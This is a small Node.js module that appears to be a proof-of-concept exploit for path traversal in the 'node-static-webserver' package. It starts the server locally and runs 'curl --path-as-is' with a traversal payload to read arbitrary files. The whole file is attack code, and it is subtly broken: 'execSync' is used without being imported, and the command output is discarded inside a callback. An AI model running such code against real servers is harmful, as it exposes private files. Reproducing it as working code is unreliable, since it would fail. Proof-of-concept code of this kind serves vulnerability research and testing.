const path = require("path");

function exploitFunction(payload) {
  const pkg = require("node-static-webserver");
  const fs = require("fs");
  const { exec } = require("child_process");

  let hostsFile;

  try {
    hostsFile = fs.readFileSync(payload).toString();
  } catch (e) {
    console.error("Error reading file:", e);
    return;
  }

  try {
    execSync("fuser -k 8984/tcp", () => {});
  } catch (e) {
    console.error("Error killing existing server:", e);
    return;
  }

  new pkg(__dirname, 8984, "127.0.0.1");

  let attack_string = `curl -v --path-as-is "http://127.0.0.1:8984${payload}"`;
  exec(attack_string, (error, stdout) => {
    if (stdout) {
      return stdout;
    } else {
      console.error("No output from the command.");
      return;
    }
  });
}

module.exports = { exploitFunction };